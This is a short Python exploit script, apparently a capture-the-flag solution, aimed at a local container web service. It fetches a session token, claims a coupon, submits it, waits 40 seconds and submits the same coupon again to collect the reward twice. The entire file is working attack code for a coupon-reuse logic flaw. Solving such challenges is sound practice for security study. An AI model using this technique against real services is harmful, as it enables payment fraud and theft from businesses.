import requests
import time

TARGET_URL = 'http://172.17.0.2:5000'
def getSession():
    res = requests.get(f"{TARGET_URL}/session")
    return res.json()['session']
    
def getCoupon(sid):
    headers = {
    "Authorization":sid
    }
    res=requests.get(f"{TARGET_URL}/coupon/claim",headers=headers)
    return res.json()['coupon']

def getMoney(sid,coupon):
    headers = {
    "Authorization":sid,
    "coupon":coupon
    }
    res=requests.get(f"{TARGET_URL}/coupon/submit",headers=headers)
    print(res.text)

sid=getSession()
c=getCoupon(sid)
getMoney(sid,c)
time.sleep(40)
getMoney(sid,c)